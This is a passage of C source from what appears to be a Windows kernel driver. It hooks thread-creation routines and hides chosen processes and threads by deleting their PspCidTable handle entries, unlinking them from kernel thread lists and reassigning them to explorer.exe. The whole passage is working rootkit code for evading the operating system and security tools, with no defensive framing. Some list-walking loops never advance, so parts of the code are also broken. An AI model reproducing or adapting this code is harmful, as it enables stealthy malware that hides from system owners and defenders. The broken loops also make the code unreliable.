	if (uPspCreateThread != 0)
	{
		LOG_DEBUG("HOOK PspCreateThread <%p>  <%p>\n", uPspCreateThread, &wPspCreateThread);
		SSDT_HOOK_NOW(&wPspCreateThread, (PVOID)uPspCreateThread, &TruePspCreateThread);
	}

	if (uPspInsertThread != 0)
	{
		uKeStartThread = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uPspInsertThread, 12));

		if (uKeStartThread != 0)
		{
			char Elm[] = { 0x48,0x8D,0x87,0,0,0,0 };
			*(DWORD*)(&Elm[3]) = offsetKprocess_ProcessList;
			for (size_t i = 0; i < 0x1000; i++)
			{
				if (RtlCompareMemory((PVOID)(uKeStartThread + i), Elm, sizeof(Elm)) == sizeof(Elm))
				{
					ULONGLONG gCode = uKeStartThread + i - 7;
					KiProcessListHead = (PLIST_ENTRY) _CODE_GET_REAL_ADDRESS_0((char *)gCode, 3);
					LOG_DEBUG("KiProcessListHead <%p>\n", KiProcessListHead);
					break;
				}
			}


			//KiProcessListHead =

		}
		LOG_DEBUG("HOOK uPspInsertThread <%p>  <%p>\n", uPspInsertThread, &wPspInsertThread);
		SSDT_HOOK_NOW(&wPspInsertThread, (PVOID)uPspInsertThread, &TruePspInsertThread);
	}


	//WIN10
    //ULONGLONG pPspClearProcessThreadCidRefs = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPspExitThread, 2));
    //LOG_DEBUG("PspClearProcessThreadCidRefs <%p>\n", pPspClearProcessThreadCidRefs);
    //WIN11
	//ULONGLONG pPspClearProcessThreadCidRefs = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pPspExitThread, 1));
	//LOG_DEBUG("PspClearProcessThreadCidRefs <%p>\n", pPspClearProcessThreadCidRefs);

	

	return TRUE; 

}

NTSTATUS RemoveSelfThread()
{

	if (offsetEthread_ThreadList == 0){
		IniLoadSys_HIDE();
	}

	DWORD64 Ethread = (DWORD64)PsGetCurrentThread();

	LIST_ENTRY* pK_LIST = (LIST_ENTRY*)(Ethread + 0x2F8);
	LIST_ENTRY* pE_LIST = (LIST_ENTRY*)(Ethread + offsetEthread_ThreadList);

	RemoveEntryList(pK_LIST);
	InitializeListHead(pK_LIST);
	RemoveEntryList(pE_LIST);
	InitializeListHead(pE_LIST);

	return 0;
}


typedef struct _HandleTableListEntry
{
	LIST_ENTRY Link;
	HANDLE dwPID;
	PEPROCESS eprocess;
	HANDLE_TABLE_ENTRY uTableEntry;
}HandleTableListEntry;



HandleTableListEntry nEntryProcessList;
HandleTableListEntry nEntryThreadList;
BOOLEAN bSpinLockHandleProcess = 0;
BOOLEAN bSpinLockHandleThread = 0;
KSPIN_LOCK ProcessSpinLock;
KSPIN_LOCK threadSpinLock;

#define HANDLE_ADD 0
#define HANDLE_DEL 1
#define HANDLE_GET 2
#define HANDLE_FIND 3

BOOLEAN changeEntryEx(LIST_ENTRY *Head ,int wType, KSPIN_LOCK* Spin, PVOID Val, DWORD nSize, HANDLE dwPID) {
	BOOLEAN r = FALSE;
	KIRQL irql;
	KeAcquireSpinLock(Spin, &irql);
	__try {
		if (wType == HANDLE_FIND) {


			HandleTableListEntry* nEntry = (HandleTableListEntry*)Head;
			HandleTableListEntry* wEntry = (HandleTableListEntry*)nEntry->Link.Flink;
			while (wEntry != nEntry)
			{
				if (dwPID == wEntry->dwPID)
				{
					r = TRUE;
					break;
				}
			}
		}
		else if (wType == HANDLE_ADD)
		{
			InsertHeadList(Head->Flink, Val);
			r = TRUE;
		}
		else if (wType == HANDLE_DEL) {
			HandleTableListEntry* nEntry = (HandleTableListEntry*)Head;
			HandleTableListEntry* wEntry = (HandleTableListEntry*)nEntry->Link.Flink;
			while (wEntry != nEntry)
			{
				if (dwPID == wEntry->dwPID)
				{
					RemoveEntryList(&wEntry->Link);
					ExFreePoolWithTag(wEntry, 'tag');
					r = TRUE;
					break;
				}
			}

		}
		else if (wType == HANDLE_GET) {
			HandleTableListEntry* nEntry = (HandleTableListEntry*)Head;
			HandleTableListEntry* wEntry = (HandleTableListEntry*)nEntry->Link.Flink;
			while (wEntry != nEntry)
			{
				if (dwPID == wEntry->dwPID)
				{
					RtlCopyMemory(Val, wEntry, nSize);
					r = TRUE;
					break;
				}
			}
		}

	}
	__except (1) {

		r = FALSE;

	}
	KeReleaseSpinLock(Spin, irql);
	return r;
}


BOOLEAN changeEntryProcess(int wType, PVOID Val, DWORD nSize, HANDLE dwPID) {
	if (!bSpinLockHandleProcess)
	{
		bSpinLockHandleProcess = TRUE;
		InitializeListHead(&nEntryProcessList.Link);
		KeInitializeSpinLock(&ProcessSpinLock);
	}
	return changeEntryEx(&nEntryProcessList.Link, wType, &ProcessSpinLock, Val, nSize, dwPID);
}




BOOLEAN wAddEntryProcessAvl(TABLE_HANDLE_INFO* TableInfo) {
	BOOLEAN r = FALSE;
	if (RtlInsertElementGenericTableAvl(&TableAvl_0, TableInfo, sizeof(TABLE_HANDLE_INFO), &r) == NULL)
		return FALSE;
	return r;
}

BOOLEAN wfindEntryProcessAvl(TABLE_HANDLE_INFO * TableInfo) {

	PTABLE_HANDLE_INFO pInfo = RtlLookupElementGenericTableAvl(&TableAvl_0, TableInfo);
	if (pInfo != NULL)
	{
		RtlCopyMemory(TableInfo, pInfo, sizeof(TABLE_HANDLE_INFO));
		return TRUE;
	}
	return FALSE;
}


PTABLE_HANDLE_INFO wGetEntryProcessAvl(TABLE_HANDLE_INFO* TableInfo) {

	PTABLE_HANDLE_INFO pTable = (PTABLE_HANDLE_INFO)RtlLookupElementGenericTableAvl(&TableAvl_0, TableInfo);
	if (pTable != NULL)
	{
		RtlCopyMemory(TableInfo, pTable, sizeof(TABLE_HANDLE_INFO));
	}
	return pTable;
}


BOOLEAN wRemoveEntryProcessAvl(TABLE_HANDLE_INFO* TableInfo) {

	return RtlDeleteElementGenericTableAvl(&TableAvl_0, TableInfo);
}




BOOLEAN wAddEntryThreadAvl(TABLE_HANDLE_INFO* TableInfo) {
	BOOLEAN r = FALSE;
	if (RtlInsertElementGenericTableAvl(&TableAvl_1, TableInfo, sizeof(TABLE_HANDLE_INFO), &r) == NULL)
		return FALSE;
	return r;
}

BOOLEAN wfindEntryThreadAvl(TABLE_HANDLE_INFO* TableInfo) {
	//KIRQL Irql;
	//KeRaiseIrql(APC_LEVEL, &Irql);

	__try {

	PTABLE_HANDLE_INFO pInfo = RtlLookupElementGenericTableAvl(&TableAvl_1, TableInfo);
	if (pInfo != NULL)
	{
		RtlCopyMemory(TableInfo, pInfo, sizeof(TABLE_HANDLE_INFO));
		//KeLowerIrql(Irql);
		return TRUE;
	}
	//KeLowerIrql(Irql);
	return FALSE;
	}
	__except (1) {

		LOG_DEBUG("wfindEntryThreadAvl  except %08X", GetExceptionCode());
	}
	return FALSE;
}


BOOLEAN wRemoveEntryThreadAvl(TABLE_HANDLE_INFO* TableInfo) {

	return RtlDeleteElementGenericTableAvl(&TableAvl_1, TableInfo);
}




//BOOLEAN changeEntryThread(int wType, PVOID Val, DWORD nSize, HANDLE dwPID) {
//	if (!bSpinLockHandleThread)
//	{
//		bSpinLockHandleThread = TRUE;
//		InitializeListHead(&nEntryThreadList.Link);
//		KeInitializeSpinLock(&threadSpinLock);
//	}
//	return changeEntryEx(&nEntryThreadList, wType, &threadSpinLock, Val, nSize, dwPID);
//}


BOOLEAN ThreadIsAdd(PETHREAD eth, LIST_ENTRY* ListHead, DWORD ofset) {
	PLIST_ENTRY kBegin = ListHead;
	PLIST_ENTRY kEntry = ListHead->Flink;
	while (kEntry != kBegin) {
		if ((ULONGLONG)kEntry - ofset == (ULONGLONG)eth){
			return TRUE;
		}
		kEntry = kEntry->Flink;
	}
	return FALSE;
}



typedef struct _WORK_INFO
{
	BOOLEAN bSucess;
	KEVENT Notify;
	WORK_QUEUE_ITEM Worker;
	HANDLE hPID;
}WORK_INFO;



//HANDLE_TABLE




//根据线程ID返回线程ETHREAD，失败返回NULL
PETHREAD LookupThread(HANDLE Tid)
{
	PETHREAD ethread = 0;
	BOOLEAN bIrql = 0;
	KIRQL irql = KeGetCurrentIrql();
	if (!(KeGetCurrentIrql() <= APC_LEVEL))
	{
		bIrql = TRUE;
		KeRaiseIrql(APC_LEVEL, &irql);
	}
	NTSTATUS status = PsLookupThreadByThreadId(Tid, &ethread);
	if (bIrql)
	{
		KeLowerIrql(irql);
	}

	if (NT_SUCCESS(status))
	{
		return ethread;
	}
	return 0;
}









BOOLEAN _RemoveFromTable(HANDLE hID, TABLE_HANDLE_INFO* Entry) {

	KIRQL irql;
	KeRaiseIrql(APC_LEVEL, &irql);
	KeEnterCriticalRegion();
	__try {

		PHANDLE_TABLE_ENTRY TableEntry = (PHANDLE_TABLE_ENTRY)wExMapHandleToPointer((PHANDLE_TABLE)*((ULONGLONG*)PspCidTable), hID);
		if (TableEntry == NULL)
		{
			KeLeaveCriticalRegion();
			KeLowerIrql(irql);
			return FALSE;
		}
		RtlCopyMemory(&Entry->TableEntry, TableEntry, sizeof(HANDLE_TABLE_ENTRY));
		NTSTATUS status = wExDestoryTable((PHANDLE_TABLE)*((ULONGLONG*)PspCidTable), hID, TableEntry);
		LOG_DEBUG("ExDestoryTable Return %08X\n", status);

	}
	__except (1) {
		KeLeaveCriticalRegion();
		KeLowerIrql(irql);
		LOG_DEBUG("except _RemoveFromTable %08X\n", GetExceptionCode());
		return FALSE;
	}
	KeLeaveCriticalRegion();
	KeLowerIrql(irql);
	return TRUE;
}




TABLE_HANDLE_INFO* mNewTableEntry(HANDLE hID, PVOID pepprocess_or_pthread) {

	TABLE_HANDLE_INFO* pEntry = (TABLE_HANDLE_INFO*)ExAllocatePoolWithTag(NonPagedPool, sizeof(TABLE_HANDLE_INFO),'tag');
	if (pEntry == NULL)
	{
		return 0;
	}
	RtlZeroMemory(pEntry, sizeof(TABLE_HANDLE_INFO));
	//RtlCopyMemory(&pEntry->uTableEntry, TableEntry, sizeof(HANDLE_TABLE_ENTRY));
	pEntry->hID = hID;
	pEntry->Object = pepprocess_or_pthread;
	InitializeListHead(&pEntry->Link);
	return pEntry;
}



typedef struct _TID_INFO{
	HANDLE tID;
	PETHREAD ethread;
	LIST_ENTRY* Link;
}TID_INFO;


HANDLE hExplorer = 0;

NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);

HANDLE getExplorerPID() {

	PEPROCESS pEprocess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)4, &pEprocess);
	if (!NT_SUCCESS(status)) {
		LOG_DEBUG("PsLookupProcessByProcessId ERROR PID:%d\n", 4);
		return FALSE;
	}


	LIST_ENTRY* fEprocess = (PLIST_ENTRY)((UINT8*)pEprocess + g_offset * 8);
	LIST_ENTRY* tfEprocess = fEprocess->Flink;
	//KIRQL irql = WPOFFx64();

	while (tfEprocess != fEprocess)
	{

		HANDLE dwPID = (HANDLE)*((DWORD64*)((char*)tfEprocess - 8));

		PEPROCESS cEprocess = NULL;
		NTSTATUS status = PsLookupProcessByProcessId(dwPID, &cEprocess);
		if (!NT_SUCCESS(status)) {
			LOG_DEBUG("PsLookupProcessByProcessId ERROR PID:%d\n", dwPID);
			tfEprocess = tfEprocess->Flink;
			continue;
		}
		UCHAR* nameM = PsGetProcessImageFileName(cEprocess);

		STRING uniFileName;
		RtlInitString(&uniFileName, "explorer.exe");// explorer.exe   //csrss.exe
		STRING cName;
		RtlInitString(&cName, nameM);


		//LOG_DEBUG(" %s %d\n", &cName.Buffer, dwPID);


		if (RtlCompareString(&uniFileName, &cName, TRUE) == 0)
		{
			hExplorer = dwPID;

		}
		ObDereferenceObject(cEprocess);

		if (hExplorer != 0)
		{
			break;
		}

		tfEprocess = tfEprocess->Flink;
	}
	//WPONx64(irql);

	ObDereferenceObject(pEprocess);
	return hExplorer;

}








//-------------------------- 




void RemoveThreadSingle(HANDLE hProcess,HANDLE hThread) {

	TABLE_HANDLE_INFO hInfo = { 0 };
	hInfo.hID = hProcess;
	PTABLE_HANDLE_INFO pGr = wGetEntryProcessAvl(&hInfo);
	if (pGr == 0)
	{
		LOG_DEBUG("Can't find ProcessAvl  %d  %d\n", hProcess, hThread);
		return;
	}
	PETHREAD ethread = 0;
	PsLookupThreadByThreadId(hThread, &ethread);
	if (ethread == 0)
	{
		LOG_DEBUG("PsLookupThreadByThreadId Error  %d\n", hThread);
		return;
	}
	ObDereferenceObject(ethread);
	PEPROCESS peprocess = 0;

	PsLookupProcessByProcessId((HANDLE)4, &peprocess);
	if (peprocess == 0)
	{
		LOG_DEBUG("PsLookupThreadByThreadId Error  %d\n", 4);
		return;
	}
	ObDereferenceObject(peprocess);


	TABLE_HANDLE_INFO* pTable = mNewTableEntry((HANDLE)hThread, ethread);
	if (pTable == NULL)
	{
		LOG_DEBUG("mNewTableEntry Thread  Wrong new Memory == null  %d  \n", hThread);
		return;
	}
	//LOG_DEBUG("HANDLE_ADD Thread  %d   %d  \n",__LINE__, gw[i].tID);

	//LOG_DEBUG("HANDLE_ADD Thread  %d  %d  \n", __LINE__, gw[i].tID);
	pTable->hID = hThread;
	pTable->Object = ethread;


	// 移除Table  虽然会创建 但是还是移除掉
	if (_RemoveFromTable(hThread, pTable))
	{
		*(ULONGLONG*)((ULONGLONG)ethread + offsetProcess) = (ULONGLONG)peprocess;
		CLIENT_ID* pID = (CLIENT_ID*)((ULONGLONG)ethread + offsetCLIENT_ID);
		//pID->UniqueThread = (ULONGLONG)hThread + 1;
		//pTable->hID = (ULONGLONG)hThread + 1;
		InsertTailList(&pGr->Link, &pTable->Link);
		LOG_DEBUG("HANDLE_ADD Thread %d  \n", hThread);
	}
	else
	{
		ExFreePoolWithTag(pTable,'tag');
	}



	if (HIDE_THREAD) {

		// 断开链条
		KAPC_STATE* pApcState = (KAPC_STATE*) ((ULONGLONG)ethread + OffsetApcState);
		PLIST_ENTRY pEntryThread = (PLIST_ENTRY)((ULONGLONG)pApcState->Process + 0x30);
		if (ThreadIsAdd(ethread, pEntryThread, 0x2F8)) {
			RemoveEntryList((PLIST_ENTRY)((ULONGLONG)ethread + 0x2F8));
			InitializeListHead((PLIST_ENTRY)((ULONGLONG)ethread + 0x2F8));
			LOG_DEBUG("Remove Thread List  KTHREAD %d  \n", hThread);
		}

		pEntryThread = (PLIST_ENTRY)((ULONGLONG)pApcState->Process + offsetEprocess_ThreadList);
		if (ThreadIsAdd(ethread, pEntryThread, offsetEthread_ThreadList)) {
			RemoveEntryList((PLIST_ENTRY)((ULONGLONG)ethread + offsetEthread_ThreadList));
			InitializeListHead((PLIST_ENTRY)((ULONGLONG)ethread + offsetEthread_ThreadList));
			LOG_DEBUG("Remove Thread List  ETHREAD %d  \n", hThread);
		}
	}


	//LOG_DEBUG("Remove Thread List %d  \n", hThread);

}


#define TABLE_LINK_ADD 0
#define TABLE_LINK_DEL 1
#define TABLE_LINK_FIND 2
#define TABLE_LINK_GET_FIRST 3
//#define TABLE_LINK_DEL 1






//APC_LEVEL
TABLE_HANDLE_INFO* wTableLink(DWORD Type, TABLE_HANDLE_INFO* hProcessEntry, TABLE_HANDLE_INFO* hThreadEntry) {
	TABLE_HANDLE_INFO* r = 0;
	KIRQL IRQL;
	KeAcquireSpinLock(&hProcessEntry->Lock, &IRQL);
	if (Type == TABLE_LINK_ADD){
		InsertTailList(&hProcessEntry->Link, &hThreadEntry->Link);
		r = hThreadEntry;
	}
	else if (Type == TABLE_LINK_DEL) {
		RemoveEntryList(&hThreadEntry->Link);
		r = hThreadEntry;
	}
	else if (Type == TABLE_LINK_FIND) {

		LIST_ENTRY* nBegin = &hProcessEntry->Link;
		LIST_ENTRY* nEntry = nBegin->Flink;
		TABLE_HANDLE_INFO* hThreadInfo = 0;
		while (nBegin != nEntry)
		{
			TABLE_HANDLE_INFO* gInfo = (TABLE_HANDLE_INFO*)(((DWORD64)nEntry) - 8);
			if (gInfo->hID == hThreadEntry->hID){
				hThreadInfo = gInfo;
				break;
			}
			nEntry = nEntry->Flink;
		}
		r = hThreadInfo;
	}
	else if (Type == TABLE_LINK_GET_FIRST) {

		LIST_ENTRY* nBegin = &hProcessEntry->Link;
		LIST_ENTRY* nEntry = nBegin->Flink;
		if (nBegin == nEntry){
			r = 0;
		}
		else
		{
			r = (TABLE_HANDLE_INFO*)(((DWORD64)nEntry) - 8);
		}
	}
	KeReleaseSpinLock(&hProcessEntry->Lock, IRQL);
	return r;
}









void RemoveThread(PLIST_ENTRY ListHead, HWND hPID , DWORD offset, int TypeProcess , TABLE_HANDLE_INFO * hProcessEntry)
{
	ExAcquireSpinLockAtDpcLevel(&SpinLock_RmoveThread_Now);

	__try
	{
		PEPROCESS Syseprocess = 0;
		PsLookupProcessByProcessId(hExplorer, &Syseprocess);
		if (Syseprocess != 0)
		{
			ObDereferenceObject(Syseprocess);



			LIST_ENTRY* _begin = ListHead;
			LIST_ENTRY* _Entry = _begin->Flink;

			//LIST_ENTRY* _begin = ListHead;
			//LIST_ENTRY* _Entry = _begin->Flink;

			TID_INFO* gw = (TID_INFO*)ExAllocatePoolWithTag(NonPagedPool, sizeof(TID_INFO) * 1000, 'tag');
			RtlZeroMemory(gw, sizeof(TID_INFO) * 1000);
			int nCount = 0;
			HANDLE zTid = 0;

			while (_Entry != _begin)
			{
				PETHREAD ethread = (PETHREAD)((ULONGLONG)_Entry - offset);
				zTid = PsGetThreadId(ethread);
				HANDLE tpid = PsGetThreadProcessId(ethread);
				if (tpid == hPID)
				{
					gw[nCount].tID = zTid;
					gw[nCount].ethread = ethread;
					gw[nCount].Link = _Entry;
					LOG_DEBUG("add thread  %d   %d  <%p>\n", zTid, tpid, _Entry);
					nCount++;
					if (nCount >= 1000)
					{
						break;
					}
				}
				else
				{
					LOG_DEBUG("other thread  %d   %d  <%p>\n", zTid, tpid, _Entry);
				}
				_Entry = _Entry->Flink;
			}

			for (int i = 0; i < nCount; i++)
			{
				TABLE_HANDLE_INFO tInfo = { 0 };
				tInfo.hID = gw[i].tID;
				tInfo.Object = gw[i].ethread;
				if (i == 0)
				{
					if (hProcessEntry->MainThead == 0)
					{
						hProcessEntry->MainThead = gw[i].tID;
						LOG_DEBUG("MainThread id  %d   %d\n", hProcessEntry->MainThead);
					}

				}
				if (MmIsAddressValid(gw[i].ethread))
				{
					if (TypeProcess == 1)
					{

						TABLE_HANDLE_INFO* pTable = mNewTableEntry(gw[i].tID, gw[i].ethread);
						if (pTable == NULL)
						{
							LOG_DEBUG("HANDLE_ADD Thread  Wrong new Memory == null  %d  \n", gw[i].tID);
							break;
						}
						
						
						//  *(ULONGLONG*)((ULONGLONG)gw[i].ethread + offsetProcess) = Syseprocess;
						//InsertTailList(&hProcessEntry->Link, &pTable->Link);
						wTableLink(TABLE_LINK_ADD, hProcessEntry, pTable);
						LOG_DEBUG("HANDLE_ADD Thread %d  \n", gw[i].tID);

						TABLE_HANDLE_INFO ThreadTableInfo = { 0 };
						ThreadTableInfo.hID = gw[i].tID;
						//TABLE_HANDLE_INFO* pTableThread = wTableLink(TABLE_LINK_FIND, hProcessEntry, pTable);
						//LOG_DEBUG("pTableThread <%p> \n", pTableThread);

						
						//pID->UniqueThread = (ULONGLONG)pID->UniqueThread + 1;
					}

					//TABLE_HANDLE_INFO* pTable = mNewTableEntry((ULONGLONG)gw[i].tID, gw[i].ethread);
					//if (pTable == NULL)
					//{
					//	LOG_DEBUG("HANDLE_ADD Thread  Wrong new Memory == null  %d  \n", gw[i].tID);
					//	break;
					//}
					//if (_RemoveFromTable(gw[i].tID, &tInfo))
					//{
					//	RtlCopyMemory(&pTable->TableEntry, &tInfo.TableEntry, sizeof(HANDLE_TABLE_ENTRY));
					//	*(ULONGLONG*)((ULONGLONG)gw[i].ethread + offsetProcess) = Syseprocess;
					//	LOG_DEBUG("HANDLE_ADD Thread %d  \n", gw[i].tID);
					//	//	tEprocess = *(ULONGLONG*)((ULONGLONG)gw[i].ethread + offsetProcess);
					//	//pTable->pCidTable = tInfo.pCidTable;
					//    InsertTailList(&hProcessEntry->Link, &pTable->Link);
					//				//---------------   可能插入和计算不同步
					//}
					//else
					//{
					//	ExFreePool(pTable);
					//}

					// 消息移交到 hExplorer

					//if (HIDE_THREAD)
					//{
					//RemoveEntryList(gw[i].Link);
					InitializeListHead(gw[i].Link);
					//}


				}
			}
			//if (HIDE_THREAD)
			//{
			//RemoveEntryList(ListHead);
			InitializeListHead(ListHead);
			//}
			ExFreePoolWithTag(gw, 'tag');
		}
	}
	__except (1) {
		LOG_EXCEPT();
	}
	ExReleaseSpinLockFromDpcLevel(&SpinLock_RmoveThread_Now);
}


void RemoveThread2(PLIST_ENTRY ListHead, HWND hPID, DWORD offset, int TypeProcess, TABLE_HANDLE_INFO* hProcessEntry)
{

	ExAcquireSpinLockAtDpcLevel(&SpinLock_RmoveThread);
	__try{
		PEPROCESS Syseprocess = 0;
		PsLookupProcessByProcessId(hExplorer, &Syseprocess);
		if (Syseprocess != 0)
		{
			ObDereferenceObject(Syseprocess);

			LIST_ENTRY* _begin = ListHead;
			LIST_ENTRY* _Entry = _begin->Flink;

			TID_INFO* gw = (TID_INFO*)ExAllocatePoolWithTag(NonPagedPool, sizeof(TID_INFO) * 1000, 'tag');
			RtlZeroMemory(gw, sizeof(TID_INFO) * 1000);
			int nCount = 0;
			HANDLE zTid = 0;

			while (_Entry != _begin)
			{
				PETHREAD ethread = (PETHREAD)((ULONGLONG)_Entry - offset);
				zTid = PsGetThreadId(ethread);
				HANDLE tpid = PsGetThreadProcessId(ethread);
				if (tpid == hPID)
				{
					gw[nCount].tID = zTid;
					gw[nCount].ethread = ethread;
					gw[nCount].Link = _Entry;
					LOG_DEBUG("add thread  %d   %d  <%p>\n", zTid, tpid, _Entry);
					nCount++;
					if (nCount >= 1000)
					{
						break;
					}
				}
				else
				{
					LOG_DEBUG("other thread  %d   %d  <%p>\n", zTid, tpid, _Entry);
				}
				_Entry = _Entry->Flink;
			}

			for (int i = 0; i < nCount; i++)
			{
				TABLE_HANDLE_INFO tInfo = { 0 };
				tInfo.hID = gw[i].tID;
				tInfo.Object = gw[i].ethread;

				if (MmIsAddressValid(gw[i].ethread))
				{
					if (TypeProcess == 1)
					{

						TABLE_HANDLE_INFO* pTable = mNewTableEntry(gw[i].tID, gw[i].ethread);
						if (pTable == NULL)
						{
							LOG_DEBUG("HANDLE_ADD Thread  Wrong new Memory == null  %d  \n", gw[i].tID);
							break;
						}
						*(ULONGLONG*)((ULONGLONG)gw[i].ethread + offsetProcess) = (ULONGLONG)Syseprocess;

						wTableLink(TABLE_LINK_ADD, hProcessEntry, pTable);
						//InsertTailList(&hProcessEntry->Link, &pTable->Link);
						LOG_DEBUG("HANDLE_ADD Thread %d  \n", gw[i].tID);
						//pID->UniqueThread = (ULONGLONG)pID->UniqueThread + 1;
					}

					//TABLE_HANDLE_INFO* pTable = mNewTableEntry((ULONGLONG)gw[i].tID /*+ 1*/, gw[i].ethread);
					//if (pTable == NULL)
					//{
					//	LOG_DEBUG("HANDLE_ADD Thread  Wrong new Memory == null  %d  \n", gw[i].tID);
					//	break;
					//}
					//if (_RemoveFromTable(gw[i].tID, &tInfo))
					//{
					//	RtlCopyMemory(&pTable->TableEntry, &tInfo.TableEntry, sizeof(HANDLE_TABLE_ENTRY));
					//	*(ULONGLONG*)((ULONGLONG)gw[i].ethread + offsetProcess) = Syseprocess;
					//	InsertHeadList(&hProcessEntry->Link, &pTable->Link);
					//	LOG_DEBUG("HANDLE_ADD Thread %d  \n", gw[i].tID);
					//		tEprocess = *(ULONGLONG*)((ULONGLONG)gw[i].ethread + offsetProcess);

					//				---------------   可能插入和计算不同步
					//	if (TypeProcess == 1)
					//	{
					//		CLIENT_ID* pID = (CLIENT_ID*)((ULONGLONG)gw[i].ethread + offsetCLIENT_ID);
					//		pID->UniqueThread = (ULONGLONG)pID->UniqueThread + 1;
					//	}
					//}
					//else
					//{
					//	ExFreePool(pTable);
					//}


					// 消息移交到 hExplorer

					//PLIST_ENTRY HEAD_ENTRY = &hProcessEntry->Link;
					//if (HEAD_ENTRY != HEAD_ENTRY->Flink && HEAD_ENTRY != HEAD_ENTRY->Blink)
					//{
					//	TABLE_HANDLE_INFO* pTableV = HEAD_ENTRY->Flink;
					//	PETHREAD bKThread = pTableV->Object;
					//	RemoveEntryList(gw[i].Link);
					//	if (TypeProcess == 0){
					//		InsertTailList((ULONGLONG)bKThread + 0x2F8, (ULONGLONG)gw[i].ethread + 0x2F8);
					//	}
					//	else if (TypeProcess == 1) {
					//		InsertTailList((ULONGLONG)bKThread + offsetEthread_ThreadList, (ULONGLONG)gw[i].ethread + offsetEthread_ThreadList);
					//	}
					//	

					//}
					//else
					//{
					//RemoveEntryList(gw[i].Link);
					//InitializeListHead(gw[i].Link);
					//	LOG_DEBUG("FOR one\n");
					//}


					//if (HIDE_THREAD)
					//{
						//RemoveEntryList(gw[i].Link);
						//InitializeListHead(gw[i].Link);
				//	}




				}
			}
			RemoveEntryList(ListHead);
			InitializeListHead(ListHead);
			ExFreePoolWithTag(gw, 'tag');
		}
	}
	__except (1) {
		LOG_EXCEPT();
	}
	ExReleaseSpinLockFromDpcLevel(&SpinLock_RmoveThread);
}


NTSTATUS wWorkRemoveThreadFromEprocess(PTABLE_HANDLE_INFO pTable) {


	//KeGetCurrentPrcb();
	//ExReleaseSpinLockExclusiveFromDpcLevel();
	//LOG_DEBUG("RemoveProcess :%d\n", pTable->hID);
	__try
	{

		PTABLE_HANDLE_INFO pGr = wGetEntryProcessAvl(pTable);
		if (pGr != 0)
		{
			//RemoveThread((ULONGLONG)pTable->Object + 0x30, pTable->hID, 0x2F8, 0, pGr);
			RemoveThread((PLIST_ENTRY)((ULONGLONG)pTable->Object + offsetEprocess_ThreadList), pTable->hID, offsetEthread_ThreadList, 1, pGr);
		}


		//LOG_DEBUG("end thread  \n");

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		LOG_DEBUG(" code EXCEPTION %08X\n", GetExceptionCode());
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}





NTSTATUS wWorkRemoveHandle(HANDLE hPID) {


	//KeGetCurrentPrcb();
	//ExReleaseSpinLockExclusiveFromDpcLevel();
//	PsProcessType;
	__try
	{

		if (hExplorer == 0)
		{
			getExplorerPID();
		}

		if (hExplorer == 0)
		{
			LOG_DEBUG("can't find hExplorer errpr\n");
			return STATUS_NOT_SUPPORTED;
		}

		PEPROCESS eprocess = 0;
		if (!NT_SUCCESS(PsLookupProcessByProcessId(hPID, &eprocess)))
		{
			LOG_DEBUG("ERROR wRemovePspCidTable eprocess errpr\n");
			return STATUS_NOT_SUPPORTED;
		}

		KPROCESS gKprocess;
		RtlCopyMemory(&gKprocess, eprocess, sizeof(KPROCESS));
		ObDereferenceObject(eprocess);


		//PETHREAD ethread = 0;
		//if (!NT_SUCCESS(PsLookupThreadByThreadId(hPID, &ethread)))
		//{
		//	LOG_DEBUG("ERROR wRemovePspCidTable ethread errpr\n");
		//	return STATUS_NOT_SUPPORTED;
		//}
		//;
		//ObReferenceObject(ethread);
	
		//DWORD runTime = *(DWORD*)((ULONGLONG)ethread + 0x50);


		//LOG_DEBUG("PspCidTable : <%p>   runTime :%08X\n", PspCidTable, runTime);





		LOG_DEBUG("PspCidTable  : <%p>\n", PspCidTable);

		//HandleTableListEntry* ProcessEntry = mNewTableEntry(hPID, eprocess);

		TABLE_HANDLE_INFO hInfo = {0};

		hInfo.hID = hPID;
		hInfo.Object = eprocess;

		if (!_RemoveFromTable(hPID, &hInfo))
		{
			LOG_DEBUG("ERROR RemoveFromTable errpr\n");
			return STATUS_NOT_SUPPORTED;
		}

		ULONGLONG eprovv = (LONGLONG)hInfo.TableEntry.Object >> 16 & 0xFFFFFFFFFFFFFFF0ui64;
		LOG_DEBUG("wExMapHandleToPointer  retu null <%p>\n", eprovv);
	
		//hInfo.hID = (ULONGLONG)hPID + 1; // 偏移加个1
		//*(DWORD*)((ULONGLONG)eprocess + (g_offset - 1) * 8) = (ULONGLONG)hPID + 1;


		wAddEntryProcessAvl(&hInfo);

		//InitializeListHead(&hInfo);

		//PEPROCESS Syseprocess = 0;
		//PsLookupProcessByProcessId(hExplorer, &Syseprocess);
		//if (Syseprocess == 0)
		//{
		//	LOG_DEBUG("ERROR hExplorer errpr\n");
		//	return STATUS_NOT_SUPPORTED;
		//}
		//ObReferenceObject(Syseprocess);
		//KPROCESS ExplorerKProcess;
		//RtlCopyMemory(&ExplorerKProcess, Syseprocess, sizeof(KPROCESS));


		PTABLE_HANDLE_INFO pGr = wGetEntryProcessAvl(&hInfo);
		

		if (pGr != 0)
		{
			InitializeListHead(&pGr->Link);
			KeInitializeSpinLock(&pGr->Lock);
		//	RemoveThread((ULONGLONG)eprocess + 0x30, hPID, 0x2F8, 0, pGr);
			RemoveThread((PLIST_ENTRY)((ULONGLONG)eprocess + offsetEprocess_ThreadList), hPID, offsetEthread_ThreadList, 1, pGr);
		}


		

		LOG_DEBUG("end thread  \n");

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		LOG_DEBUG(" code EXCEPTION %08X\n", GetExceptionCode());
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}




void
NTAPI
HideHandleWorker(
	__inout PVOID Argument
) {

	WORK_INFO *pWorkInfo = Argument;
	pWorkInfo->bSucess = (BOOLEAN)wWorkRemoveHandle(pWorkInfo->hPID);
	//KeSetEvent(&pWorkInfo->Notify, LOW_PRIORITY, FALSE);
}



NTSTATUS wRemovePspCidTable(HANDLE hPID)
{
	if (wExDestoryTable == 0 || PspCidTable == 0)
	{
		LOG_DEBUG("ERROR wRemovePspCidTable\n");
		return STATUS_NOT_SUPPORTED;
	}

	WORK_INFO gWorkInfo;

